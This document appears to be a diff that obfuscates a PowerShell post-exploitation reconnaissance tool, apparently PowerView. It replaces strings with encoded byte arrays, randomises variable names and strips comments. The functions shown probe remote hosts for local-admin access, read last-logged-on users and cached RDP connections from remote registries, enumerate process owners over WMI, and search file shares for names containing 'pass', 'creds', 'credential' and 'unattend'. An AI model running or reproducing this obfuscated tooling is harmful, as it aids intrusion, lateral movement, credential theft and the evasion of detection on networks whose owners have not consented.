+            Write-Verbuse ((ParseEntry20 @(6,164,19,63,97,11,4,154,54,40,60,55,29,138,20,120) @(82,227,85,69,5,78)) + $orwQ)
         }
     }
 }
-
-
 function Invoke-CheckLocalAdminAccess {
-<#
-    .SYNOPSIS
-
-        This function will use the OpenSCManagerW Win32API call to to establish
-        a handle to the remote host. If this succeeds, the current user context
-        has local administrator acess to the target.
-
-        Idea stolen from the local_admin_search_enum post module in Metasploit written by:
-            'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
-            'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>'
-            'Royce Davis "r3dy" <rdavis[at]accuvant.com>'
-
-    .PARAMETER ComputerName
-
-        The hostname to query for active sessions.
-
-    .OUTPUTS
-
-        $True if the current user has local admin access to the hostname, $False otherwise
-
-    .EXAMPLE
-
-        PS C:\> Invoke-CheckLocalAdminAccess -ComputerName sqlserver
-
-        Returns active sessions on the local host.
-
-    .LINK
-
-        https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/local_admin_search_enum.rb
-        http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
-#>
-
     [CmdletBinding()]
     param(
         [Parameter(ValueFromPipeline=$True)]
@@ -6955,69 +3473,27 @@ function Invoke-CheckLocalAdminAccess {
         [Alias('HostName')]
         $ComputerName = 'localhost'
     )
-
     begin {
         if ($PSBoundParameters['Debug']) {
             $DebugPreference = 'Continue'
         }
     }
-
     process {
-
-        # process multiple host object types from the pipeline
         $ComputerName = Get-NameField -Object $ComputerName
-
-        # 0xF003F - SC_MANAGER_ALL_ACCESS
-        #   http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx
-        $qT9jK = $FQMCj1Kr::OpenSCManagerW((([char]0x5c+[char]0x5c) + $ComputerName), 'ServicesActive', 0xF003F)
-
-        Write-Debug ((HandleResult95 @(8,206,135,5,57,171,198,91,23,204,252,88,1,206,252,69,15,222,139,93,2,206,202,117,1,222,131,71,57,242,244,93,2,171,228,77,56,224,240,88,2,206,135,92,57,222,231,1,18,216,143,10) @(91,153,178,55)) + $qT9jK)
-
-        # if we get a non-zero handle back, everything was successful
-        if ($qT9jK -ne 0) {
-            # Close off the service handle
-            $Null = $FQMCj1Kr::CloseServiceHandle($qT9jK)
+        $liv8 = $sND5Za::OpenSCManagerW((([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw="))) + $ComputerName), 'ServicesActive', 0xF003F)
+        Write-Debug ((ParseEntry20 @(165,59,169,12,148,94,232,82,186,57,210,81,172,59,210,76,162,43,165,84,175,59,228,124,172,43,173,78,148,7,218,84,175,94,202,68,149,21,222,81,175,59,169,85,148,43,201,8,191,45,161,3) @(246,108,156,62)) + $liv8)
+        if ($liv8 -ne 0) {
+            $Null = $sND5Za::CloseServiceHandle($liv8)
             $True
         }
         else {
-            # otherwise it failed - get the last error
-            #   error codes - http://msdn.microsoft.com/en-us/library/windows/desktop/ms681382(v=vs.85).aspx
-            $zgfuO = $jAC8b6ZC::GetLastError()
-            Write-Debug ((HandleResult95 @(246,250,108,5,101,33,173,121,233,248,23,88,93,68,151,103,241,234,96,93,94,68,161,87,255,234,104,71,101,120,159,127,252,159,15,77,100,106,155,88,252,245,23,7,85,75,147,108,199,158,16,1,78,82,228,40) @(165,173,89,55,7,19,217,21)) + $zgfuO)
+            $orwQ = $H7dxZ::GetLastError()
+            Write-Debug ((ParseEntry20 @(188,126,16,173,242,114,155,69,105,202,222,47,181,126,107,237,196,7,214,67,124,200,232,2,181,110,20,239,242,43,169,67,124,173,198,58,140,80,103,210,201,24,161,25,119,199,218,57,141,26,108,169,217,1,210,20) @(239,41,37,159,144,64)) + $orwQ)
             $False
         }
     }
 }
-
-
 function Get-LastLoggedOn {
-<#
-    .SYNOPSIS
-
-        This function uses remote registry functionality to return
-        the last user logged onto a target machine.
-
-        Note: This function requires administrative rights on the
-        machine you're enumerating.
-
-    .PARAMETER ComputerName
-
-        The hostname to query for the last logged on user.
-        Defaults to the localhost.
-
-    .EXAMPLE
-
-        PS C:\> Get-LastLoggedOn
-
-        Returns the last user logged onto the local machine.
-
-    .EXAMPLE
-        
-        PS C:\> Get-LastLoggedOn -ComputerName WINDOWS1
-
-        Returns the last user logged onto WINDOWS1
-#>
-
     [CmdletBinding()]
     param(
         [Parameter(ValueFromPipeline=$True)]
@@ -7025,468 +3501,231 @@ function Get-LastLoggedOn {
         [Alias('HostName')]        
         $ComputerName = "."
     )
-
     process {
-
-        # process multiple host object types from the pipeline
         $ComputerName = Get-NameField -Object $ComputerName
-
-        # try to open up the remote registry key to grab the last logged on user
         try {
-            $iIbun = [WMIClass](([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw="))) + $ComputerName + (HandleResult95 @(82,225,141,139,225,61,88,202,157,186,213,99,83,241,145,142,231,74,122,211,163,186,209,93,80,254,163,172,224,99,51,155) @(10,169,199,253,131,14)))
-            $bUVaI = 2147483650
-            $RXgmW2 = (HandleResult95 @(37,46,189,59,142,158,20,92,209,23,142,187,36,73,232,22,187,181,73,100,230,78,130,232,40,88,224,12,186,181,34,104,224,79,150,187,33,45,210,5,187,181,38,107,224,58,130,180,19,112,202,12,186,234,69,125,213,36,142,232,17,89,210,9,188,159,28,116,221,36,138,168,18,44,177,31,140,159,73,112,230,78,237,142,35,79,185,65) @(112,30,132,124,216,216))
-            $Value = (HandleResult95 @(52,238,61,218,4,236,3,214,58,155,31,204,58,236,66,213,54,241,53,204,3,206,70,157) @(96,169,123,160))
-            $iIbun.GetStringValue($bUVaI, $RXgmW2, $Value).sValue
+            $GIhV = [WMIClass](([char]0x5c+[char]0x5c) + $ComputerName + (ParseEntry20 @(251,4,141,148,160,180,104,188,249,11,145,143,155,223,108,172,199,8,183,152,166,192,104,140,249,27,163,179,161,234,3,237) @(163,76,199,226,194,135,58,223)))
+            $RHizZl = 2147483650
+            $rRcQU = (ParseEntry20 @(116,116,131,246,188,72,69,6,239,218,188,109,117,19,214,219,137,99,24,62,216,131,176,62,121,2,222,193,136,99,115,50,222,130,164,109,112,119,236,200,137,99,119,49,222,247,176,98,66,42,244,193,136,60,20,39,235,233,188,62,64,3,236,196,142,73,77,46,227,233,184,126,67,118,143,210,190,73,24,42,216,131,223,88,114,21,135,140) @(33,68,186,177,234,14))
+            $Value = (ParseEntry20 @(86,196,227,245,188,194,122,245,255,189,188,235,88,198,156,250,142,223,76,239,198,232,229,186) @(2,131,165,143,216,135))
+            $GIhV.GetStringValue($RHizZl, $rRcQU, $Value).sValue
         }
         catch {
-            Write-Warning ((HandleResult95 @(152,194,179,114,90,86,23,182,216,152,47,106,90,6,246,204,175,65,38,99,35,162,216,146,117,126,69,53,173,136,167,122,90,91,11,163,225,199,122,105,119,9,133,142,188,81,42,102,8,142,134,200) @(207,187,245,22,19,19,65)) + $ComputerName + (HandleResult95 @(89,11,121,120,84,49,92,99,6,124,126,105,5,0,67,12,90,115,64,86,14,123,9,92,73,73,10,31,79,53,67,30,71,33,88,99,6,120,105,98,4,0,83,11,89,108,88,13,33,114,95,6) @(21,98,59,43,14,102,109)))
+            Write-Warning ((ParseEntry20 @(122,189,109,33,100,129,125,60,78,169,18,60,100,131,18,50,119,147,30,53,79,169,72,34,78,169,125,49,79,247,121,41,100,140,97,41,119,246,71,63,73,140,97,112,100,131,18,48,100,133,22,120) @(45,196,43,69)) + $ComputerName + (ParseEntry20 @(71,59,209,205,205,245,58,36,247,217,194,197,104,63,197,240,246,250,69,98,240,240,252,197,105,21,255,236,205,245,115,103,218,217,162,212,111,17,209,242,245,207,77,59,241,217,193,201,71,53,174,163) @(11,82,147,158,151,162)))
             $Null
         }
     }
 }
-
-
 function Get-CachedRDPConnection {
-<#
-    .SYNOPSIS
-
-        Uses remote registry functionality to query all entries for the
-        "Windows Remote Desktop Connection Client" on a machine, separated by
-        user and target server.
-
-        Note: This function requires administrative rights on the
-        machine you're enumerating.
-
-    .PARAMETER ComputerName
-
-        The hostname to query for RDP client information.
-        Defaults to localhost.
-
-    .PARAMETER RemoteUserName
-
-        The "domain\username" to use for the WMI call on the remote system.
-        If supplied, 'RemotePassword' must be supplied as well.
-
-    .PARAMETER RemotePassword
-
-        The password to use for the WMI call on a remote system.
-
-    .EXAMPLE
-
-        PS C:\> Get-CachedRDPConnection
-
-        Returns the RDP connection client information for the local machine.
-
-    .EXAMPLE
-
-        PS C:\> Get-CachedRDPConnection -ComputerName WINDOWS2.testlab.local
-
-        Returns the RDP connection client information for the WINDOWS2.testlab.local machine
-
-    .EXAMPLE
-
-        PS C:\> Get-CachedRDPConnection -ComputerName WINDOWS2.testlab.local -RemoteUserName DOMAIN\user -RemotePassword Password123!
-
-        Returns the RDP connection client information for the WINDOWS2.testlab.local machine using alternate credentials.
-#>
-
     [CmdletBinding()]
     param(
         [Parameter(ValueFromPipeline=$True)]
         [String]
-        $ComputerName = (HandleResult95 @(215,201,48,152,167,179,205,225,107,193,176,212) @(181,142,9,242,254,228)),
-
+        $ComputerName = (ParseEntry20 @(193,159,49,144,106,158,219,183,106,201,125,249) @(163,216,8,250,51,201)),
         [String]
         $RemoteUserName,
-
         [String]
         $RemotePassword
     )
-
     begin {
         if ($RemoteUserName -and $RemotePassword) {
             $Password = $RemotePassword | ConvertTo-SecureString -AsPlainText -Force
             $Credential = New-Object System.Management.Automation.PSCredential($RemoteUserName,$Password)
         }
-
-        # HKEY_USERS
-        $ZQ78s = 2147483651
+        $n478c = 2147483651
     }
-
     process {
-
         try {
             if($Credential) {
-                $iIbun = Get-Wmiobject -List 'StdRegProv' -Namespace root\default -Computername $ComputerName -Credential $Credential -ErrorAction SilentlyContinue
+                $GIhV = Get-Wmiobject -List 'StdRegProv' -Namespace root\default -Computername $ComputerName -Credential $Credential -ErrorAction SilentlyContinue
             }
             else {
-                $iIbun = Get-Wmiobject -List 'StdRegProv' -Namespace root\default -Computername $ComputerName -ErrorAction SilentlyContinue
+                $GIhV = Get-Wmiobject -List 'StdRegProv' -Namespace root\default -Computername $ComputerName -ErrorAction SilentlyContinue
             }
         }
         catch {
-            Write-Warning ((HandleResult95 @(134,161,225,188,239,78,170,179,160,252,139,231,39,187,154,131,202,146,184,19,170,149,196,150) @(212,249,171,197,141,125,227)) + $ComputerName + (HandleResult95 @(55,161,94,73,28,148,31,76,25,170,119,93,28,148,94,90,31,181,70,87,28,148,37,80,33,181,41,10,52,139,41,76,24,143,45,74,30,240,37,80,25,208,41,64,52,132,82,89,50,165,70,74,30,174,61,19,34,181,100,73,52,139,33,17,25,165,74,64,52,132,82,85,50,165,116,76,30,240,58,29) @(123,226,28,58,125,195,107,32)))
+            Write-Warning ((ParseEntry20 @(71,72,160,32,126,10,148,114,73,189,23,118,99,133,91,106,139,14,41,87,148,84,45,215) @(21,16,234,89,28,57,221)) + $ComputerName + (ParseEntry20 @(186,102,74,231,137,161,81,100,246,160,157,66,105,195,221,140,65,95,206,133,151,114,70,228,178,161,16,56,221,160,180,73,107,249,217,134,70,59,218,152,148,23,61,238,161,177,28,113,221,175,172,85,107,249,190,197,124,95,236,155,191,109,66,165,138,177,115,114,221,175,207,80,65,211,128,128,70,59,197,213) @(246,37,8,148,232)))
         }
-
-        if(!$iIbun) {
-            Write-Warning ((HandleResult95 @(133,180,13,45,67,139,209,108,142,187,9,62,123,224,214,113,182,187,114,58,104,249,165,54) @(215,236,71,84,33,184,152,11)) + $ComputerName + (HandleResult95 @(11,57,131,217,249,31,51,22,163,226,243,47,38,45,244,208,252,31,29,23,160,253,214,56,29,45,244,154,209,0,5,22,162,199,169,56,36,73,143,218,250,122,114,0,136,237,161,49,14,61,155,218,251,37,17,73,152,253,224,59,14,50,139,155,250,15,17,0,136,237,161,61,14,61,169,220,251,123,22,71) @(71,122,193,170,152,72)))
+        if(!$GIhV) {
+            Write-Warning ((ParseEntry20 @(132,168,107,97,36,149,159,151,120,79,8,204,140,168,111,98,39,241,227,158,104,89,123,155) @(214,240,33,24,70,166)) + $ComputerName + (ParseEntry20 @(255,117,81,203,8,138,119,223,84,91,211,14,188,84,134,76,119,239,51,176,98,228,120,99,226,62,232,51,250,126,81,212,10,176,50,195,85,32,246,25,191,49,134,76,90,255,80,164,74,244,108,99,219,4,139,48,234,97,107,203,32,149,73,130,84,84,238,19,148,68,138,67,90,255,1,171,96,128,103,46) @(179,54,19,184,105,221,3)))
         }
         else {
-            # extract out the SIDs of domain users in this hive
-            $KsR0HWpu = ($iIbun.EnumKey($ZQ78s, "")).sNames | ? { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }
-
-            foreach ($vEV7hR in $KsR0HWpu) {
-
+            $WFhE = ($GIhV.EnumKey($n478c, "")).sNames | ? { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }
+            foreach ($YniZ1ZYN in $WFhE) {
                 try {
-                    $UserName = Convert-SidToName $vEV7hR
-
-                    # pull out all the cached RDP connections
-                    $UQo2eC = $iIbun.EnumValues($ZQ78s,($vEV7hR + (HandleResult95 @(27,24,103,77,119,173,151,232,26,6,99,87,117,134,244,171,26,109,99,77,78,241,252,182,39,24,81,110,119,155,143,175,34,9,28,83,79,128,135,143,25,6,99,9,119,155,140,188,18,108,81,75,119,148,240,235,27,27,123,87,119,174,131,234,33,22,120,6) @(67,94,41,59,45,195,197,219)))).sNames
-
-                    foreach ($tI3QosEk in $UQo2eC) {
-                        # make sure this key is a cached connection
-                        if($tI3QosEk -match 'MRU.*') {
-                            $TargetServer = $iIbun.GetStringValue($ZQ78s, ($vEV7hR + (HandleResult95 @(10,85,106,223,20,100,226,194,11,75,110,197,22,79,129,129,11,32,110,223,45,56,137,156,54,85,92,252,20,82,250,133,51,68,17,193,44,73,242,165,8,75,110,155,20,82,249,150,3,33,92,217,20,93,133,193,10,86,118,197,20,103,246,192,48,91,117,148) @(82,19,36,169,78,10,176,241))), $tI3QosEk).sValue
-                            
-                            $yJJuerXu = New-Object PSObject
-                            $yJJuerXu | Add-Member Noteproperty 'ComputerName' $ComputerName
-                            $yJJuerXu | Add-Member Noteproperty 'UserName' $UserName
-                            $yJJuerXu | Add-Member Noteproperty 'UserSID' $vEV7hR
-                            $yJJuerXu | Add-Member Noteproperty 'TargetServer' $TargetServer
-                            $yJJuerXu | Add-Member Noteproperty 'UsernameHint' $Null
-                            $yJJuerXu
+                    $UserName = Convert-SidToName $YniZ1ZYN
+                    $fdEG = $GIhV.EnumValues($n478c,($YniZ1ZYN + (ParseEntry20 @(23,214,225,187,34,32,29,163,246,149,50,34,23,213,158,189,33,125,5,230,204,255,65,35,43,214,215,152,34,22,5,228,206,154,77,38,45,211,237,153,34,22,5,162,245,149,49,41,30,162,215,189,34,25,122,160,247,136,42,34,21,253,233,252,26,6,30,173) @(79,144,175,205,120,78)))).sNames
+                    foreach ($eEUqUQz in $fdEG) {
+                        if($eEUqUQz -match 'MRU.*') {
+                            $TargetServer = $GIhV.GetStringValue($n478c, ($YniZ1ZYN + (ParseEntry20 @(8,159,190,76,175,62,139,195,99,173,26,181,168,127,196,32,128,195,112,131,51,235,201,87,145,22,161,165,96,173,26,173,145,109,192,56,187,179,120,161,10,129,186,8,175,8,144,151,107,199,40,169,170,109,192,96,129,181,104,153,10,180,182,11,151,24,136,205) @(80,217,240,58,245))), $eEUqUQz).sValue
+                            $a9MFpM = New-Object PSObject
+                            $a9MFpM | Add-Member Noteproperty 'ComputerName' $ComputerName
+                            $a9MFpM | Add-Member Noteproperty 'UserName' $UserName
+                            $a9MFpM | Add-Member Noteproperty 'UserSID' $YniZ1ZYN
+                            $a9MFpM | Add-Member Noteproperty 'TargetServer' $TargetServer
+                            $a9MFpM | Add-Member Noteproperty 'UsernameHint' $Null
+                            $a9MFpM
                         }
                     }
-
-                    # pull out all the cached server info with username hints
-                    $kODsSRgF = $iIbun.EnumKey($ZQ78s,($vEV7hR + (HandleResult95 @(198,55,218,71,206,197,53,91,199,41,222,93,204,238,86,24,199,66,222,71,247,153,94,5,250,55,236,100,206,243,45,28,255,38,161,89,246,232,37,60,196,41,222,3,206,243,46,15,207,67,236,65,206,252,82,88,198,55,218,93,247,197,61,4,253,31,217,12) @(158,113,148,49,148,171,103,104)))).sNames
-
-                    foreach ($BCqCw1p in $kODsSRgF) {
-
-                        $J8vp = $iIbun.GetStringValue($ZQ78s, ($vEV7hR + (HandleResult95 @(45,206,98,29,213,83,77,83,44,208,102,7,215,120,46,16,44,187,102,29,236,15,38,13,17,206,84,62,213,101,85,20,20,223,25,3,237,126,93,52,47,208,102,89,213,101,86,7,36,186,84,27,213,106,42,80,45,206,98,7,236,83,69,12,22,230,98,8) @(117,136,44,107,143,61,31,96)) + $BCqCw1p), 'UsernameHint').sValue
-                        
-                        $yJJuerXu = New-Object PSObject
-                        $yJJuerXu | Add-Member Noteproperty 'ComputerName' $ComputerName
-                        $yJJuerXu | Add-Member Noteproperty 'UserName' $UserName
-                        $yJJuerXu | Add-Member Noteproperty 'UserSID' $vEV7hR
-                        $yJJuerXu | Add-Member Noteproperty 'TargetServer' $BCqCw1p
-                        $yJJuerXu | Add-Member Noteproperty 'UsernameHint' $J8vp
-                        $yJJuerXu   
+                    $Iwk6n = $GIhV.EnumKey($n478c,($YniZ1ZYN + (ParseEntry20 @(7,171,48,88,5,131,44,29,6,181,52,66,7,168,79,94,6,222,52,88,60,223,71,67,59,171,6,123,5,181,52,90,62,186,75,70,61,174,60,122,5,181,52,28,5,181,55,73,14,223,6,94,5,186,75,30,7,171,48,66,60,131,36,66,60,131,51,19) @(95,237,126,46)))).sNames
+                    foreach ($aXOOQM in $Iwk6n) {
+                        $Z0D6J = $GIhV.GetStringValue($n478c, ($YniZ1ZYN + (ParseEntry20 @(105,49,241,28,231,115,220,2,46,231,32,209,69,203,0,7,230,89,247,107,237,3,78,210,14,251,101,219,107,47,245,30,220,74,187,89,21,252,40,233,71,214,123,69,229,50,244,122,223,3,15,207,48,234,40,190,105,49,241,6,222,115,212,93,20,209,36,222) @(49,119,191,106,189,29,142)) + $aXOOQM), 'UsernameHint').sValue
+                        $a9MFpM = New-Object PSObject
+                        $a9MFpM | Add-Member Noteproperty 'ComputerName' $ComputerName
+                        $a9MFpM | Add-Member Noteproperty 'UserName' $UserName
+                        $a9MFpM | Add-Member Noteproperty 'UserSID' $YniZ1ZYN
+                        $a9MFpM | Add-Member Noteproperty 'TargetServer' $aXOOQM
+                        $a9MFpM | Add-Member Noteproperty 'UsernameHint' $Z0D6J
+                        $a9MFpM   
                     }
-
                 }
                 catch {
-                    Write-Debug ((HandleResult95 @(159,43,60,143,175,64,63,192,132,50,75,203) @(205,115,118,246)) + $_)
+                    Write-Debug ((ParseEntry20 @(31,156,143,37,47,247,140,106,4,133,248,97) @(77,196,197,92)) + $_)
                 }
             }
         }
     }
 }
-
-
 function Get-NetProcess {
-<#
-    .SYNOPSIS
-
-        Gets a list of processes/owners on a remote machine.
-
-    .PARAMETER ComputerName
-
-        The hostname to query processes. Defaults to the local host name.
-
-    .PARAMETER RemoteUserName
-
-        The "domain\username" to use for the WMI call on a remote system.
-        If supplied, 'RemotePassword' must be supplied as well.
-
-    .PARAMETER RemotePassword
-
-        The password to use for the WMI call on a remote system.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetProcess -ComputerName WINDOWS1
-    
-        Returns the current processes for WINDOWS1
-#>
-
     [CmdletBinding()]
     param(
         [Parameter(ValueFromPipeline=$True)]
         [String]
         $ComputerName,
-
         [String]
         $RemoteUserName,
-
         [String]
         $RemotePassword
     )
-
     process {
-        
         if($ComputerName) {
-            # process multiple host object types from the pipeline
             $ComputerName = Get-NameField -Object $ComputerName          
         }
         else {
-            # default to the local hostname
             $ComputerName = [System.Net.Dns]::GetHostName()
         }
-
         $Credential = $Null
-
         if($RemoteUserName) {
             if($RemotePassword) {
                 $Password = $RemotePassword | ConvertTo-SecureString -AsPlainText -Force
                 $Credential = New-Object System.Management.Automation.PSCredential($RemoteUserName,$Password)
-
-                # try to enumerate the processes on the remote machine using the supplied credential
                 try {
                     Get-WMIobject -Class Win32_process -ComputerName $ComputerName -Credential $Credential | ForEach-Object {
-                        $F98npsZ0 = $_.getowner();
+                        $fSHbo = $_.getowner();
                         $Process = New-Object PSObject
                         $Process | Add-Member Noteproperty 'ComputerName' $ComputerName
                         $Process | Add-Member Noteproperty 'ProcessName' $_.ProcessName
                         $Process | Add-Member Noteproperty 'ProcessID' $_.ProcessID
-                        $Process | Add-Member Noteproperty 'Domain' $F98npsZ0.Domain
-                        $Process | Add-Member Noteproperty 'User' $F98npsZ0.User
+                        $Process | Add-Member Noteproperty 'Domain' $fSHbo.Domain
+                        $Process | Add-Member Noteproperty 'User' $fSHbo.User
                         $Process
                     }
                 }
                 catch {
-                    Write-Verbose ((HandleResult95 @(39,11,32,112,36,61,199,238,19,31,95,109,36,63,199,226,20,37,87,120,14,21,215,167,17,37,83,122,36,48,219,251,18,37,95,36,55,43,211,224,19,31,95,126,55,32,223,237,42,42,43,103,36,63,215,253,41,64,48,110,14,1,211,228,17,37,18,120,15,48,250,240,42,53,48,97,12,47,199,252,63,27,39,41) @(112,114,102,20,109,120,145,151)) + $_)
+                    Write-Verbose ((ParseEntry20 @(233,236,144,40,247,203,232,236,181,33,135,247,247,210,128,57,218,217,143,249,181,33,248,190,223,194,227,34,247,198,244,249,180,27,135,190,228,198,148,59,221,227,135,255,140,20,240,244,228,205,155,63,247,201,248,255,143,126,232,244,221,236,148,63,223,217,202,249,180,4,213,233,228,210,128,57,223,217,232,254,153,37,255,179) @(190,149,214,76,190,142)) + $_)
                 }
             }
             else {
-                Write-Warning (HandleResult95 @(236,119,89,211,242,72,85,219,217,89,38,135,225,88,93,223,216,61,81,132,217,61,85,220,242,73,46,134,216,61,78,208,226,89,103,205,217,119,93,222,225,93,93,205,223,86,93,192,217,73,115,219,225,77,90,138) @(187,14,31,183))
+                Write-Warning (ParseEntry20 @(224,187,51,30,142,175,253,174,23,45,254,217,237,148,55,18,164,218,249,241,23,73,141,130,254,133,68,75,164,218,230,165,44,45,191,147,213,187,55,19,157,186,245,184,17,34,133,158,213,133,25,22,157,170,242,255) @(183,194,117,122,199,233))
             }
         }
         else {
-            # try to enumerate the processes on the remote machine
             try {
                 Get-WMIobject -Class Win32_process -ComputerName $ComputerName | ForEach-Object {
-                    $F98npsZ0 = $_.getowner();
+                    $fSHbo = $_.getowner();
                     $Process = New-Object PSObject
                     $Process | Add-Member Noteproperty 'ComputerName' $ComputerName
                     $Process | Add-Member Noteproperty 'ProcessName' $_.ProcessName
                     $Process | Add-Member Noteproperty 'ProcessID' $_.ProcessID
-                    $Process | Add-Member Noteproperty 'Domain' $F98npsZ0.Domain
-                    $Process | Add-Member Noteproperty 'User' $F98npsZ0.User
+                    $Process | Add-Member Noteproperty 'Domain' $fSHbo.Domain
+                    $Process | Add-Member Noteproperty 'User' $fSHbo.User
                     $Process
                 }
             }
             catch {
-                Write-Verbose ((HandleResult95 @(86,141,78,247,72,177,94,234,98,153,49,234,72,179,94,230,101,163,57,255,98,153,78,163,96,163,61,253,72,188,66,255,99,163,49,163,91,167,74,228,98,153,49,249,91,172,70,233,91,172,69,224,72,179,78,249,88,198,94,233,98,141,74,224,96,163,124,255,99,188,99,244,91,179,94,230,96,163,94,248,78,157,73,174) @(1,244,8,147)) + $_)
+                Write-Verbose ((ParseEntry20 @(44,37,71,194,156,159,71,242,24,49,56,223,156,157,71,254,31,11,48,202,182,183,87,187,26,11,52,200,156,146,91,231,25,11,56,150,143,137,83,252,24,49,56,204,143,130,95,241,33,4,76,213,156,157,87,225,34,110,87,220,182,163,83,248,26,11,117,202,183,146,122,236,33,27,87,211,180,141,71,224,52,53,64,155) @(123,92,1,166,213,218,17,139)) + $_)
             }
         }
     }
 }
-
-
 function Find-InterestingFile {
-<#
-    .SYNOPSIS
-
-        This function recursively searches a given UNC path for files with
-        specific keywords in the name (default of pass, sensitive, secret, admin,
-        login and unattend*.xml). The output can be piped out to a csv with the
-        -OutFile flag. By default, hidden files/folders are included in search results.
-
-    .PARAMETER Path
-
-        UNC/local path to recursively search.
-
-    .PARAMETER Terms
-
-        Terms to search for.
-
-    .PARAMETER OfficeDocs
-
-        Switch. Search for office documents (*.doc*, *.xls*, *.ppt*)
-
-    .PARAMETER FreshEXEs
-
-        Switch. Find .EXEs accessed within the last week.
-
-    .PARAMETER LastAccessTime
-
-        Only return files with a LastAccessTime greater than this date value.
-
-    .PARAMETER LastWriteTime
-
-        Only return files with a LastWriteTime greater than this date value.
-
-    .PARAMETER CreationTime
-
-        Only return files with a CreationTime greater than this date value.
-
-    .PARAMETER ExcludeFolders
-
-        Switch. Exclude folders from the search results.
-
-    .PARAMETER ExcludeHidden
-
-        Switch. Exclude hidden files and folders from the search results.
-
-    .PARAMETER CheckWriteAccess
-
-        Switch. Only returns files the current user has write access to.
-
-    .PARAMETER OutFile
-
-        Output results to a specified csv output file.
-
-    .PARAMETER UsePSDrive
-
-        Switch. Mount target remote path with temporary PSDrives.
-
-    .PARAMETER Credential
-
-        Credential to use to mount the PSDrive for searching.
-
-    .OUTPUTS
-
-        The full path, owner, lastaccess time, lastwrite time, and size for each found file.
-
-    .EXAMPLE
-
-        PS C:\> Find-InterestingFile -Path C:\Backup\
-        
-        Returns any files on the local path C:\Backup\ that have the default
-        search term set in the title.
-
-    .EXAMPLE
-
-        PS C:\> Find-InterestingFile -Path \\WINDOWS7\Users\ -Terms salaries,email -OutFile out.csv
-        
-        Returns any files on the remote path \\WINDOWS7\Users\ that have 'salaries'
-        or 'email' in the title, and writes the results out to a csv file
-        named 'out.csv'
-
-    .EXAMPLE
-
-        PS C:\> Find-InterestingFile -Path \\WINDOWS7\Users\ -LastAccessTime (Get-Date).AddDays(-7)
-
-        Returns any files on the remote path \\WINDOWS7\Users\ that have the default
-        search term set in the title and were accessed within the last week.
-
-    .LINK
-        
-        http://www.harmj0y.net/blog/redteaming/file-server-triage-on-red-team-engagements/
-#>
-
     [CmdletBinding()]
     param(
         [Parameter(ValueFromPipeline=$True)]
         [String]
         $Path = '.\',
-
         [String[]]
         $Terms,
-
         [Switch]
         $OfficeDocs,
-
         [Switch]
         $FreshEXEs,
-
         [String]
         $LastAccessTime,
-
         [String]
         $LastWriteTime,
-
         [String]
         $CreationTime,
-
         [Switch]
         $ExcludeFolders,
-
         [Switch]
         $ExcludeHidden,
-
         [Switch]
         $CheckWriteAccess,
-
         [String]
         $OutFile,
-
         [Switch]
         $UsePSDrive,
-
         [System.Management.Automation.PSCredential]
         $Credential = [System.Management.Automation.PSCredential]::Empty
     )
-
     begin {
-        # default search terms
-        $eswm = @('pass', 'sensitive', 'admin', 'login', 'secret', 'unattend*.xml', '.vmdk', 'creds', 'credential', '.config')
-
+        $VrCC = @('pass', 'sensitive', 'admin', 'login', 'secret', 'unattend*.xml', '.vmdk', 'creds', 'credential', '.config')
         if(!$Path.EndsWith('\')) {
             $Path = $Path + '\'
         }
         if($Credential -ne [System.Management.Automation.PSCredential]::Empty) { $UsePSDrive = $True }
-
-        # check if custom search terms were passed
         if ($Terms) {
             if($Terms -isnot [system.array]) {
                 $Terms = @($Terms)
             }
-            $eswm = $Terms
+            $VrCC = $Terms
         }
-
-        if(-not $eswm[0].startswith("*")) {
-            # append wildcards to the front and back of all search terms
-            for ($kUfFVle = 0; $kUfFVle -lt $eswm.Count; $kUfFVle++) {
-                $eswm[$kUfFVle] = ("*" + $($eswm[$kUfFVle]) + "*")
+        if(-not $VrCC[0].startswith("*")) {
+            for ($h4S0 = 0; $h4S0 -lt $VrCC.Count; $h4S0++) {
+                $VrCC[$h4S0] = ("*" + $($VrCC[$h4S0]) + "*")
             }
         }
-
-        # search just for office documents if specified
         if ($OfficeDocs) {
-            $eswm = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
+            $VrCC = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
         }
-
-        # find .exe's accessed within the last 7 days
         if($FreshEXEs) {
-            # get an access time limit of 7 days ago
             $LastAccessTime = (get-date).AddDays(-7).ToString('MM/dd/yyyy')
-            $eswm = '*.exe'
+            $VrCC = '*.exe'
         }
-
         if($UsePSDrive) {
-            # if we're PSDrives, create a temporary mount point
-            $u5Ie777 = $Path.split('\')
-            $mnwhsX0k = $u5Ie777[0..($u5Ie777.length-2)] -join '\'
-            $FilePath = $u5Ie777[-1]
-            $nXovd = ((HandleResult95 @(180,193,78,76,183,209,82,75,183,164,108,86,140,251,112,85,143,193,49,80,142,222,66,95,142,165,86,23,137,248,96,18,136,206,107,27) @(237,150,4,38)).ToCharArray() | Get-Random -Count 7) -join ''
-            
-            Write-Verbose ((HandleResult95 @(17,7,69,52,145,181,23,32,30,104,144,188,38,23,58,53,146,152,4,109) @(69,80,124,5,243,219)) + $Path + (HandleResult95 @(195,253,42,91,122,78,28,128,195,242,57,70,127,94,127,154,233,246,62,112,78,41,123,151,235,237,38,77,82,94,111,222,195,244,65,28) @(138,181,124,33,27,25,41,238)) + $nXovd)
-
+            $A6w2GNY = $Path.split('\')
+            $RGUSl5I = $A6w2GNY[0..($A6w2GNY.length-2)] -join '\'
+            $FilePath = $A6w2GNY[-1]
+            $Qh217c4 = ((ParseEntry20 @(190,192,198,231,189,208,218,224,189,165,228,253,134,250,248,254,133,192,185,251,132,223,202,244,132,164,222,188,131,249,232,185,130,207,227,176) @(231,151,140,141)).ToCharArray() | Get-Random -Count 7) -join ''
